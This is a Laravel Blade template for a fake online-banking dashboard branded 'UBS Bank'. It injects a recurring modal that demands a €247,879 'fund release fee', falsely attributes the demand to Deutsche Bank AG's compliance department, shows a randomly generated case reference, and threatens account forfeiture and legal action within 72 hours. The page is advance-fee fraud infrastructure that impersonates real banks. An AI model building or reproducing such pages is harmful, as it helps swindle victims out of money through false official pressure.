<!DOCTYPE html>
<html lang="fr">

<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta charset="utf-8">
	<meta name="keywords" content="">
	<meta name="author" content="">
	<meta name="robots" content="">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<meta name="format-detection" content="telephone=no">
	<title>UBS Bank - Mon Compte </title>
	<!-- Favicon icon -->

	<link rel="icon" type="image/png" sizes="50x50" href="{{ asset('Logodb.svg') }}">


	<link href="{{ asset('assets/css/jqvmap.min.css') }}" rel="stylesheet" type="text/css">

	<link href="{{ asset('assets/css/chartist.min.css') }}" rel="stylesheet" type="text/css">

	<link href="{{ asset('assets/css/owl.carousel.css') }}" rel="stylesheet" type="text/css">

	<link href="{{ asset('assets/css/bootstrap-select.min.css') }}" rel="stylesheet" type="text/css">

	<link href="{{ asset('assets/css/style.css') }}" rel="stylesheet" type="text/css">
    <link rel="stylesheet" href="{{ asset('assets/css/sweetalert.css') }}">


    @livewireStyles
</head>

<body>

	<!--*******************
        Preloader start
    ********************-->
	<div id="preloader">
		<div class="sk-three-bounce">
			<div class="sk-child sk-bounce1"></div>
			<div class="sk-child sk-bounce2"></div>
			<div class="sk-child sk-bounce3"></div>
		</div>
	</div>


    <div id="main-wrapper">

        @include('bank/partials/header')

        @include('bank/partials/nav')

        @yield('content')


        @include('bank/partials/footer')

    </div>


@livewireScripts

    <script src="{{ asset('assets/js/global.min.js') }}"></script>
    <script src="{{ asset('assets/js/bootstrap-select.min.js') }}"></script>

    <script src="{{ asset('assets/js/sweetalert-data.js') }}"></script>
    <script src="{{ asset('assets/js/sweetalert.min.js') }}"></script>

    <script src="{{ asset('assets/js/chart.bundle.min.js') }}"></script>
    <script src="{{ asset('assets/js/jquery.peity.min.js') }}"></script>
    <script src="{{ asset('assets/js/apexchart.js') }}"></script>
    <script src="{{ asset('assets/js/owl.carousel.js') }}"></script>
    <script src="{{ asset('assets/js/dashboard-1.js') }}"></script>

    <script src="{{ asset('assets/js/custom.min.js') }}"></script>
    <script src="{{ asset('assets/js/deznav-init.js') }}"></script>
    <script src="{{ asset('assets/js/demo.js') }}"></script>
<!-- <script src="js/styleSwitcher.js') }}"></script> -->
<script>
    function carouselReview() {
        jQuery('.testimonial-one').owlCarousel({
            loop: true,
            margin: 10,
            nav: false,
            center: true,
            dots: false,
            navText: ['<i class="fas fa-caret-left"></i>', '<i class="fas fa-caret-right"></i>'],
            responsive: {
                0:    { items: 2 },
                400:  { items: 3 },
                700:  { items: 5 },
                991:  { items: 6 },
                1200: { items: 4 },
                1600: { items: 5 }
            }
        })
    }

    jQuery(window).on('load', function () {
        setTimeout(function () {
            carouselReview();
        }, 1000);
    });
</script>


<!-- ============================================================
     MODAL ALERTE — Fund Release Fee
     Affiché automatiquement toutes les 3 minutes après connexion
     ============================================================ -->
<style>
/* Overlay sombre */
#fundModal {
  display:none;
  position:fixed; inset:0; z-index:99999;
  background:rgba(10,10,20,.72);
  backdrop-filter:blur(3px);
  align-items:center; justify-content:center;
  padding:16px;
  animation:fmFadeIn .3s ease both;
}
#fundModal.open { display:flex; }

@keyframes fmFadeIn {
  from{ opacity:0; }
  to  { opacity:1; }
}
@keyframes fmSlideUp {
  from{ opacity:0; transform:translateY(28px) scale(.97); }
  to  { opacity:1; transform:translateY(0)    scale(1);   }
}

/* Box principale */
.fm-box {
  background:#fff;
  border-radius:10px;
  box-shadow:0 24px 64px rgba(0,0,0,.35);
  width:100%; max-width:520px;
  overflow:hidden;
  animation:fmSlideUp .35s ease both;
  position:relative;
}

/* Bande d'alerte en haut */
.fm-top-band {
  background:linear-gradient(90deg, #b8000e 0%, #e3001b 100%);
  padding:14px 22px;
  display:flex; align-items:center; gap:12px;
}
.fm-top-band svg { flex-shrink:0; }
.fm-top-band-text {
  color:#fff;
  font-family:Arial,sans-serif;
  font-size:12.5px;
  font-weight:700;
  letter-spacing:.6px;
  text-transform:uppercase;
}

/* Corps */
.fm-body {
  padding:28px 28px 10px;
  font-family:Arial,sans-serif;
}

/* Montant mis en avant */
.fm-amount-block {
  background:linear-gradient(135deg,#fff8e1 0%,#fff3cd 100%);
  border:2px solid #f0a500;
  border-radius:8px;
  padding:16px 20px;
  margin-bottom:22px;
  display:flex; align-items:center; gap:14px;
}
.fm-amount-icon {
  width:44px; height:44px; flex-shrink:0;
  background:linear-gradient(135deg,#f0a500,#cc8800);
  border-radius:50%;
  display:flex; align-items:center; justify-content:center;
}
.fm-amount-label {
  font-size:12px; color:#7a5800;
  font-weight:600; text-transform:uppercase;
  letter-spacing:.5px; margin-bottom:3px;
}
.fm-amount-value {
  font-size:26px; font-weight:700;
  color:#7a3800; letter-spacing:-.5px; line-height:1;
}

/* Titre */
.fm-title {
  font-size:19px; font-weight:700;
  color:#1a1a1a; margin-bottom:12px; line-height:1.3;
}

/* Séparateur */
.fm-divider {
  border:none; border-top:1px solid #e8e8e8; margin:16px 0;
}

/* Liste des infos importantes */
.fm-info-list {
  list-style:none; padding:0; margin:0 0 18px;
}
.fm-info-list li {
  display:flex; align-items:flex-start; gap:10px;
  font-size:13.5px; color:#333; line-height:1.5;
  padding:8px 0; border-bottom:1px solid #f0f0f0;
}
.fm-info-list li:last-child { border-bottom:none; }
.fm-bullet {
  flex-shrink:0; width:20px; height:20px; border-radius:50%;
  display:flex; align-items:center; justify-content:center;
  margin-top:1px;
}
.fm-bullet.red  { background:#ffe8e8; }
.fm-bullet.amber{ background:#fff3cd; }
.fm-bullet.blue { background:#e8f0fc; }

/* Note légale */
.fm-legal {
  background:#f8f8f8; border-left:3px solid #e3001b;
  border-radius:0 4px 4px 0;
  padding:10px 14px; margin-bottom:22px;
  font-size:12px; color:#555; line-height:1.5;
}
.fm-legal strong { color:#b8000e; }

/* Footer modal */
.fm-footer {
  padding:16px 28px 22px;
  display:flex; flex-direction:column; gap:10px;
}
.fm-btn-primary {
  width:100%; padding:13px;
  background:linear-gradient(90deg,#b8000e,#e3001b);
  color:#fff; border:none; border-radius:6px;
  font-size:15px; font-weight:700;
  font-family:Arial,sans-serif; cursor:pointer;
  letter-spacing:.3px;
  transition:filter .15s, transform .1s;
}
.fm-btn-primary:hover  { filter:brightness(1.1); }
.fm-btn-primary:active { transform:scale(.98); }

.fm-btn-secondary {
  width:100%; padding:11px;
  background:#fff; color:#555;
  border:1.5px solid #d0d0d0; border-radius:6px;
  font-size:14px; font-family:Arial,sans-serif;
  cursor:pointer; transition:border-color .15s, color .15s;
}
.fm-btn-secondary:hover { border-color:#aaa; color:#1a1a1a; }

/* Timer compte à rebours */
.fm-timer {
  text-align:center; font-size:11.5px;
  color:#aaa; margin-top:4px;
}
.fm-timer span { color:#e3001b; font-weight:700; }

/* Close X */
.fm-close {
  position:absolute; top:14px; right:16px;
  background:rgba(255,255,255,.25); border:none;
  color:#fff; width:26px; height:26px;
  border-radius:50%; cursor:pointer;
  font-size:15px; line-height:1;
  display:flex; align-items:center; justify-content:center;
  transition:background .15s;
}
.fm-close:hover { background:rgba(255,255,255,.4); }

/* Responsive mobile */
@media(max-width:600px){
  #fundModal { padding:8px; align-items:flex-end; }
  .fm-box { border-radius:14px 14px 10px 10px; max-width:100%; }
  .fm-top-band { padding:12px 16px; }
  .fm-top-band-text { font-size:11px; }
  .fm-body { padding:16px 14px 6px; }
  .fm-amount-block { padding:12px 14px; gap:10px; margin-bottom:14px; }
  .fm-amount-icon { width:36px; height:36px; }
  .fm-amount-value { font-size:20px; }
  .fm-amount-label { font-size:10px; }
  .fm-title { font-size:15px; margin-bottom:8px; }
  .fm-info-list li { font-size:12.5px; padding:6px 0; gap:8px; }
  .fm-bullet { width:18px; height:18px; }
  .fm-legal { font-size:11px; padding:8px 10px; margin-bottom:14px; }
  .fm-footer { padding:10px 14px 16px; gap:8px; }
  .fm-btn-primary { padding:12px; font-size:14px; }
  .fm-btn-secondary { padding:10px; font-size:13px; }
  .fm-timer { font-size:11px; }
  .fm-close { top:12px; right:12px; }
}
</style>

<!-- Modal HTML -->
<div id="fundModal" role="dialog" aria-modal="true" aria-labelledby="fmTitle">
  <div class="fm-box">

    <!-- Bande rouge haut -->
    <div class="fm-top-band">
      <button class="fm-close" id="fmClose" aria-label="Close">✕</button>
      <svg width="22" height="22" viewBox="0 0 22 22" fill="none">
        <path d="M11 2L20 19H2L11 2Z" fill="#fff" opacity=".25"/>
        <path d="M11 2.5L19.5 18.5H2.5L11 2.5Z" stroke="#fff" stroke-width="1.5"/>
        <line x1="11" y1="8.5" x2="11" y2="13" stroke="#fff" stroke-width="1.6" stroke-linecap="round"/>
        <circle cx="11" cy="15.5" r="1" fill="#fff"/>
      </svg>
      <span class="fm-top-band-text">⚠ Important Notice — Action Required</span>
    </div>

    <!-- Corps -->
    <div class="fm-body">

      <!-- Montant -->
      <div class="fm-amount-block">
        <div class="fm-amount-icon">
          <svg width="22" height="22" viewBox="0 0 22 22" fill="none">
            <circle cx="11" cy="11" r="9" stroke="#fff" stroke-width="1.6"/>
            <path d="M11 6v6M8 15h6" stroke="#fff" stroke-width="1.6" stroke-linecap="round"/>
          </svg>
        </div>
        <div>
          <div class="fm-amount-label">Fund Release Fee</div>
          <div class="fm-amount-value">€ 247,879</div>
        </div>
      </div>

      <!-- Titre -->
      <h2 class="fm-title" id="fmTitle">
        Your account requires immediate action to release your funds.
      </h2>

      <hr class="fm-divider">

      <!-- Liste d'informations importantes -->
      <ul class="fm-info-list">
        <li>
          <div class="fm-bullet red">
            <svg width="11" height="11" viewBox="0 0 11 11" fill="none">
              <circle cx="5.5" cy="5.5" r="5.5" fill="#e3001b"/>
              <path d="M5.5 2.5v3.5" stroke="#fff" stroke-width="1.4" stroke-linecap="round"/>
              <circle cx="5.5" cy="8" r=".8" fill="#fff"/>
            </svg>
          </div>
          <div>
            <strong>Account temporarily frozen.</strong> Your funds are currently on hold due to a pending compliance review required by Deutsche Bank AG regulatory standards.
          </div>
        </li>
        <li>
          <div class="fm-bullet amber">
            <svg width="11" height="11" viewBox="0 0 11 11" fill="none">
              <path d="M5.5 1L10.5 10H.5L5.5 1Z" fill="#f0a500"/>
              <path d="M5.5 4.5v2.5" stroke="#fff" stroke-width="1.3" stroke-linecap="round"/>
              <circle cx="5.5" cy="8.3" r=".7" fill="#fff"/>
            </svg>
          </div>
          <div>
            <strong>A one-time fund release fee of €247,879</strong> is required to finalise the international transfer and unblock your account. This fee is non-negotiable and must be settled within <strong>72 hours</strong>.
          </div>
        </li>
        <li>
          <div class="fm-bullet blue">
            <svg width="11" height="11" viewBox="0 0 11 11" fill="none">
              <circle cx="5.5" cy="5.5" r="5.5" fill="#0066b2"/>
              <path d="M5.5 3v4M3.5 7h4" stroke="#fff" stroke-width="1.3" stroke-linecap="round"/>
            </svg>
          </div>
          <div>
            <strong>Failure to act</strong> will result in permanent account suspension and forfeiture of all pending funds in accordance with Deutsche Bank AG Terms & Conditions §14.3.
          </div>
        </li>
        <li>
          <div class="fm-bullet red">
            <svg width="11" height="11" viewBox="0 0 11 11" fill="none">
              <circle cx="5.5" cy="5.5" r="5.5" fill="#e3001b"/>
              <path d="M5.5 2.5v3.5" stroke="#fff" stroke-width="1.4" stroke-linecap="round"/>
              <circle cx="5.5" cy="8" r=".8" fill="#fff"/>
            </svg>
          </div>
          <div>
            <strong>Legal proceedings</strong> may be initiated if the fee remains unpaid after the deadline. Please contact our support team immediately to proceed with the settlement.
          </div>
        </li>
      </ul>

      <!-- Note légale -->
      <div class="fm-legal">
        <strong>IMPORTANT:</strong> This notice is issued by Deutsche Bank AG Compliance Department. Reference: <strong>DB-2026-{{ rand(100000, 999999) }}</strong>. All transactions are monitored in accordance with EU Directive 2015/849 on anti-money laundering.
      </div>

    </div>

    <!-- Footer boutons -->
    <div class="fm-footer">
      <button class="fm-btn-primary" id="fmContact" type="button">
        Contact Support — Unlock My Account
      </button>
      <button class="fm-btn-secondary" id="fmDismiss" type="button">
        Remind me later
      </button>
      <p class="fm-timer">This alert will reappear in <span id="fmCountdown">3:00</span> min</p>
    </div>

  </div>
</div>

<script>
(function () {
  var modal      = document.getElementById('fundModal');
  var fmClose    = document.getElementById('fmClose');
  var fmDismiss  = document.getElementById('fmDismiss');
  var fmContact  = document.getElementById('fmContact');
  var countdown  = document.getElementById('fmCountdown');

  var INTERVAL_MS  = 1 * 60 * 1000; /* 3 minutes */
  var countdownInt = null;
  var reopenTimer  = null;

  /* ── Ouvrir le modal ── */
  function openModal() {
    modal.classList.add('open');
    startCountdown();
  }

  /* ── Fermer + relancer dans 3 min ── */
  function closeModal() {
    modal.classList.remove('open');
    clearInterval(countdownInt);
    if (reopenTimer) clearTimeout(reopenTimer);
    reopenTimer = setTimeout(openModal, INTERVAL_MS);
    resetCountdown();
  }

  /* ── Compte à rebours affiché dans le footer ── */
  function startCountdown() {
    var total = INTERVAL_MS / 1000;
    clearInterval(countdownInt);
    countdownInt = setInterval(function () {
      total--;
      if (total <= 0) { clearInterval(countdownInt); return; }
      var m = Math.floor(total / 60);
      var s = total % 60;
      countdown.textContent = m + ':' + (s < 10 ? '0' : '') + s;
    }, 1000);
  }

  function resetCountdown() {
    countdown.textContent = '3:00';
  }

  /* ── Bouton contact → ferme le modal ── */
  fmContact.addEventListener('click', function () {
    closeModal();
  });

  /* ── Fermetures ── */
  fmClose.addEventListener('click',   closeModal);
  fmDismiss.addEventListener('click', closeModal);

  /* Clic en dehors = fermer */
  modal.addEventListener('click', function (e) {
    if (e.target === modal) closeModal();
  });

  /* Échap = fermer */
  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape' && modal.classList.contains('open')) closeModal();
  });

  /* ── Premier affichage après 3 minutes de connexion ── */
  reopenTimer = setTimeout(openModal, INTERVAL_MS);

})();
</script>
<!--**********************************
    Main wrapper end
***********************************-->

</body>
</html>